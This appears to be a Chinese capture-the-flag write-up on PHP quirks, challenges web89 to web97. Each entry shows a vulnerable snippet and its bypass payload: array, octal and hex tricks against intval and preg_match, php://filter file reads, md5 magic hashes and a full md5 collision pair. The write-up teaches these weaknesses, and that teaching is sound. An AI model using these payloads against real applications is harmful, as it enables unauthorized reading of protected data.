        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-intval-function.html" target="_blank" rel="noopener">intval函数(获取变量的整数型)</a>：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p><p><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">preg_match() 函数</a></p><p>利用数组绕过正则匹配，使其返回值发生错误而为false</p><p><strong>payload：?num[]=1</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="intval-num-0-："><a href="#intval-num-0-：" class="headerlink" title="intval($num,0)："></a>intval($num,0)：</h3><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><p><strong>payload：?num=010574</strong>这里我以0开始，意思就是后面的数字将被以8进制的形式读取</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：正则表达式修饰符<br>拓展</p><pre class="line-numbers language-php"><code class="language-php">i 不区分<span class="token punctuation">(</span>ignore<span class="token punctuation">)</span>大小写m多<span class="token punctuation">(</span>more<span class="token punctuation">)</span>行匹配若存在换行\<span class="token package">n</span>并且有开始<span class="token operator">^</span>或结束$符的情况下，将以换行为分隔符，逐行进行匹配<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abc\nabc"</span><span class="token punctuation">;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string">"/^abc$/m"</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matchs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 <span class="token punctuation">.</span> 中包含换行符默认的圆点 <span class="token punctuation">.</span> 是匹配除换行符 \<span class="token package">n</span> 之外的任何单字符，加上s之后<span class="token punctuation">,</span> <span class="token punctuation">.</span>包含换行符<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abggab\nacbs"</span><span class="token punctuation">;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string">"/b./s"</span><span class="token punctuation">;</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matchs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这样匹配到的有三个 bg b\<span class="token package">n</span> bsA强制从目标字符串开头匹配<span class="token punctuation">;</span>D如果使用$限制结尾字符<span class="token punctuation">,</span>则不允许结尾有换行<span class="token punctuation">;</span> e配合函数<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>使用<span class="token punctuation">,</span> 可以把匹配来的字符串当作正则表达式执行<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足第一个匹配：?cmd=%0aphp，同时不满足第二匹配(固定字符串”php”)</p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：?num=0x117c</strong></p><p>这里我采用的是16进制绕过</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里直接八进制绕过?num=010574</strong></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 在这个地方需要返回的值不能为0，也就是说0不能在第一位</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>所以?num=4476.0</strong></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 点匹配没了</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用八进制开头加号代替空格绕过?num=+010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>paylaod:</p><pre><code>./flag.php/var/www/html/flag.phpphp://filter/resource=flag.php</code></pre><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5弱类型比较可以直接数组绕过，其结果都会转换为null</p><pre><code>a[]=1&amp;b[]=2</code></pre><p>如果进行了string强制转类型后，则不再接受数组</p><p>弱碰撞：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span>md5弱比较，为0e开头的会被识别为科学记数法，结果均为<span class="token number">0</span>，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。payload<span class="token punctuation">:</span> a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token number">240610708</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>强碰撞：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span>这时候需要找到两个真正的md5值相同数据a<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">0E</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">5C</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token constant">B2</span><span class="token operator">%</span><span class="token constant">1B</span><span class="token operator">%</span><span class="token constant">DCV</span><span class="token operator">%</span><span class="token constant">B7J</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>C0x<span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">28K</span><span class="token operator">%</span>F3n<span class="token operator">%</span><span class="token constant">8EKU</span><span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">D1U</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">FB_</span><span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">0E</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">5C</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token constant">B2</span><span class="token operator">%</span><span class="token constant">1B</span><span class="token operator">%</span><span class="token constant">DCV</span><span class="token operator">%</span><span class="token constant">B7J</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>C0x<span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">28K</span><span class="token operator">%</span>F3n<span class="token operator">%</span><span class="token constant">8EKU</span><span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">D1</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">FB_</span><span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token 